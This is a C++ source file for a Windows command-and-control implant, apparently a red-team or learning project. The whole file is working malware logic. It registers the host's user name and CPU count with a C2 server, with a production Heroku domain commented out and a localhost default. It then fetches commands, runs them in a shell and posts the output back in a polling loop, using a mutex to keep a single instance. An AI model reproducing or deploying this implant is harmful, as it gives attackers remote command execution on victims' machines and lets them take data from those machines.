#include <windows.h>
#include <string>
#include <iostream>
#include <stdlib.h>
#include "http.h"
#include "exec_shell.h"
#include "aes_gcm.h"
#include "nlohmann/json.hpp"

using json = nlohmann::json;

// implant configurations

// production domain
// LPCWSTR c2Domain = L"c2-server-app.herokuapp.com";
// int port = 443;

// development domain
LPCWSTR c2Domain = L"127.0.0.1";
int port = 5000;

LPCWSTR registerURI = L"/agent/register";
LPCWSTR getTaskURI = L"/agent/get_task";
LPCWSTR sendResultURI = L"agent/send_result";
std::string password = "password";
std::string agentId;
DWORD sleepTime = 10 * 1000;
BOOL useTLS = FALSE;  // set to true for HTTPs

// generate a random agent id of size digits
std::string generateRandomId(int size) {
    std::string id = "";
    for (int i = 0; i < size; i++) {
        id += std::to_string(rand() % 10);
    }
    return id;
}

// register the agent on the c2 server
BOOL registerAgent() {
    std::string name = exec_shell(CommonCmd::whoami);
    int cpuCount = std::stoi(exec_shell(CommonCmd::cpu_num));
    
    json jsonPayload = {
        {"whoami", name},
        {"agent_id", agentId},
        {"password", password},
        {"cpus", cpuCount}
    };

    std::string jsonString = jsonPayload.dump();
    std::string response = httpPost(c2Domain, port, registerURI, jsonString, useTLS);
    if (response == "Error") {
        return FALSE;
    }
    std::cout << response << std::endl;

    json jsonResponse = json::parse(response);

    if (jsonResponse["status"] == "ok") {
        return TRUE;
    } else {
        return FALSE;
    }
}

// execute the list of commands and send the result back to the server
void executeCommands(std::vector<std::string> cmds) {
    for (int i = 0; i < cmds.size(); i++) {
        std::string result = exec_shell(&*cmds[i].begin());
        std::cout << result << std::endl;

        json jsonResult = {
            {"agent_id", agentId},
            {"password", password},
            {"command", cmds[i]},
            {"result", result}
        };

        std::string jsonString = jsonResult.dump();

        std::string response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);

        if (response == "Error") {
            return;
        }

        std::cout << response << std::endl;
    }
}

// get commands from server and execute them
void getTasksAndExecute() {
    json jsonPayload = {
        {"agent_id", agentId},
        {"password", password}
    };
    std::string jsonString = jsonPayload.dump();

    std::string response = httpPost(c2Domain, port, getTaskURI, jsonString, useTLS);

    if (response == "Error") {
        return;
    }

    json jsonResponse = json::parse(response);

    if (jsonResponse["status"] == "ok") {
        std::vector<std::string> cmds = jsonResponse["cmd"];
        executeCommands(cmds);
    } else {
        std::cout << "no tasks at this time" << std::endl;
    }
}

int main(int argc, char* argv[]){

    // use a mutex to prevent multiple instances of the implant
    LPCSTR szUniqueNamedMutex = "magic_conch";
    HANDLE hHandle = CreateMutexA( NULL, TRUE, szUniqueNamedMutex );
    if( ERROR_ALREADY_EXISTS == GetLastError() )
    {
        // Program already running somewhere
        return 0; // Exit program
    }

    agentId = generateRandomId(10);
    BOOL registered = FALSE;
    do {
        registered = registerAgent();
    } while (!registered);

    int i = 3;
    while(i > 0) {
        std::cout << "wake up" << std::endl;
        getTasksAndExecute();
        Sleep(sleepTime);
        i--;
    }

    // Upon app closing:
    ReleaseMutex( hHandle ); // Explicitly release mutex
    CloseHandle( hHandle ); // close handle before terminating

    return 0;
}